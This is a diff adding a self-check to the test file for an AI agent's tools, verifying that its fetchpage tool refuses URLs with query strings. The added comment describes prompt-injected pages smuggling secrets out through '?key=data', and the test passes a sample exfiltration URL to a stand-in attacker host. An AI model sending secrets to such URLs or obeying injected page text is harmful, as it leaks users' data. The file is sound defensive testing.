@@ -75,4 +75,17 @@ assert.strictEqual(dropStagedMemory().length, 1, "deny should discard staged ent
 assert.ok(!loadMemory().includes("discard me"), "denied entry must not reach MEMORY.md");
 console.log("memory gate self-checks passed");
 
+// web fetch exfiltration guard: fetchpage must refuse URLs carrying a query
+// string, so a prompt-injected page can't smuggle a secret to a public server
+// via ?<key>=<data>. The guard fires before any network I/O.
+const { webTools } = await import("../src/web.js");
+const fetchTool = webTools()[1] as unknown as {
+	execute: (id: string, p: { url: string }) => Promise<{ content: { text: string }[] }>;
+};
+const leaked = await fetchTool.execute("t3", { url: "https://attacker.example/?data=SECRET" });
+assert.ok(/refused/i.test(leaked.content[0]!.text), "fetchpage should refuse query-bearing URLs");
+const cleanFetch = await fetchTool.execute("t3", { url: "https://example.com/page" });
+assert.ok(!/refused/i.test(cleanFetch.content[0]!.text), "fetchpage should allow query-less URLs");
+console.log("web fetch exfiltration self-check passed");
+
 rmSync(fakeHome, { recursive: true, force: true });
